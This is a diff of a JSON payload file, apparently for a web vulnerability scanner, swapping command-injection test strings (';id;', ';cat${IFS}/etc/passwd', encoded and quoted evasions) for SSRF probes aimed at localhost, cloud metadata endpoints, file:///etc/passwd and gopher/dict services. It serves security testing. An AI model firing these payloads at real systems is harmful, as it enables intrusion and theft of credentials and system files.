@@ -1,167 +1,142 @@
 [
   {
-    "id": "cmd-injection-basic",
+    "id": "ssrf-basic",
     "info": {
-      "name": "Command Injection - Basic Tests",
-      "severity": "critical",
-      "category": "command-injection",
-      "description": "Tests for OS command injection vulnerabilities",
+      "name": "Server-Side Request Forgery - Basic",
+      "severity": "high",
+      "category": "ssrf",
+      "description": "Tests for SSRF vulnerabilities targeting internal resources",
       "references": [
-        "https://owasp.org/www-community/attacks/Command_Injection"
+        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
       ],
       "tags": [
-        "command-injection",
-        "rce"
+        "ssrf",
+        "network"
       ]
     },
     "payloads": [
       {
-        "value": "; echo 'vulnerable'",
+        "value": "http://localhost",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "| echo vulnerable",
+        "value": "http://127.0.0.1",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "& echo vulnerable &",
+        "value": "http://0.0.0.0",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "`echo vulnerable`",
+        "value": "http://[::1]",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "$(echo vulnerable)",
+        "value": "http://169.254.169.254/latest/meta-data/",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";id;",
+        "value": "http://metadata.google.internal/computeMetadata/v1/",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "||id",
+        "value": "http://localhost:22",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "&&id",
+        "value": "http://localhost:3306",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "|id|",
+        "value": "http://localhost:6379",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "`id`",
+        "value": "file:///etc/passwd",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "$(id)",
+        "value": "file:///c:/windows/win.ini",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";w\\h\\o\\a\\m\\i",
+        "value": "gopher://127.0.0.1:25/_MAIL",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";{cat,/etc/passwd}",
+        "value": "dict://127.0.0.1:11211/stat",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";cat${IFS}/etc/passwd",
+        "value": "http://127.1",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";cat</etc/passwd",
+        "value": "http://127.0.1",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "%0Aid",
+        "value": "http://2130706433",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "`%0Als%0A`",
+        "value": "http://0x7f.0x0.0x0.0x1",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";${IFS}id",
+        "value": "http://localhost%00.com",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";$IFS$9id",
+        "value": "http://127.0.0.1%00.com",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";i\\d",
+        "value": "http://127.0.0.1.xip.io",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";'i'd",
+        "value": "http://127.0.0.1.nip.io",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": ";\"i\"d",
+        "value": "http://localtest.me",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "%0a id %0a",
+        "value": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "%0d id %0d",
+        "value": "http://[0:0:0:0:0:ffff:127.0.0.1]",
         "encoding": "none",
         "method": "GET"
       },
       {
-        "value": "%3Bid%3B",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "%26id%26",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "%7Cid%7C",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";\nid\n",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "$(<command)",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "`<command>`",
+        "value": "http://①②⑦.⓪.⓪.①",
         "encoding": "none",
         "method": "GET"
       }
@@ -171,7 +146,11 @@
         "type": "response_body",
         "condition": "contains",
         "patterns": [
-          "vulnerable"
+          "ami-id",
+          "instance-id",
+          "local-hostname",
+          "root:x:",
+          "[extensions]"
         ]
       }
     ]
